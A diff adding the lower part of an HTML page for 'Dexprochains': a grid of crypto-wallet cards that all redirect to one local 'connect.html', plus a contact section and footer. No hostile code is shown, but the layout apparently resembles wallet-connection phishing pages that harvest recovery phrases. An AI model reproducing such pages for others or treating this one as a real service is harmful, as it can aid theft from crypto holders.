+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/maiarwallet.png" alt="maiarwallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Maiar Wallet</h5>
+                    <span class="wallet-site">maiar.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/jade_wallet.jpg" alt="jadewallet class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Jade Wallet</h5>
+                    <span class="wallet-site">jadewallet.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/o3_wallet.jpg" alt="O3Wallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>O3Wallet</h5>
+                    <span class="wallet-site">03.network</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/hashkey_me.jpg" alt="HashKey" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Hashkey Me</h5>
+                    <span class="wallet-site">me.hashkey.com</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/rwallet.jpg" alt="RWallet" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>RWallet</h5>
+                    <span class="wallet-site">rsk.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/kyberswap.jpg" alt="KyberSwap" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>KyberSwap</h5>
+                    <span class="wallet-site">kyberswap</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/tongue_wallet.jpg" alt="Tongue" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Tongue Wallet</h5>
+                    <span class="wallet-site">tongue.fi</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/xinfin.jpg" alt="XinFin" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Xinfin XDC Network</h5>
+                    <span class="wallet-site">xinfin.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/talken_wallet.jpg" alt="Talken" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Talken Wallet</h5>
+                    <span class="wallet-site">talken.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/keyring_pro.jpg" alt="KEYRING" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>KEYRING PRO</h5>
+                    <span class="wallet-site">keyring.app</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/midas_wallet.jpg" alt="midasprotocol" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Midas Wallet</h5>
+                    <span class="wallet-site">midasprotocol.io</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/imtoken.jpg" alt="imToken" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>imToken</h5>
+                    <span class="wallet-site">token.im</span>
+                </div>
+            </div>
+
+            <div class="wallet-card" onclick="window.location.href='connect.html';">
+                <div class="wallet-avatar">
+                    <img src="asset/images/logo/walleth.jpg" alt="Others" class="avatar">
+                </div>
+                <div class="wallet-info">
+                    <h5>Others</h5>
+                    <span class="wallet-site">[Multichain]</span>
+                </div>
+            </div>
+    </section>
+    
+</div>
+<section id="contact-us">
+    <div class="contact-container">
+        <h2>CONTACT US</h2>
+        <p>If you have any questions or need assistance, feel free to reach out!</p>
+        <div class="contact-links">
+            <a href="mailto:support@dexprochains.com" class="contact-button">Email Us</a>
+            <a href="#" target="_blank" class="contact-button">X</a>
+            <a href="#" target="_blank" class="contact-button">Facebook</a>
+        </div>
+    </div>
+</section>
+
+<!--footer section -->
+<footer class="credit">
+    <p>© 2025 Dexprochains. All rights reserved.</p>
+</footer>
+</body>
+</html>
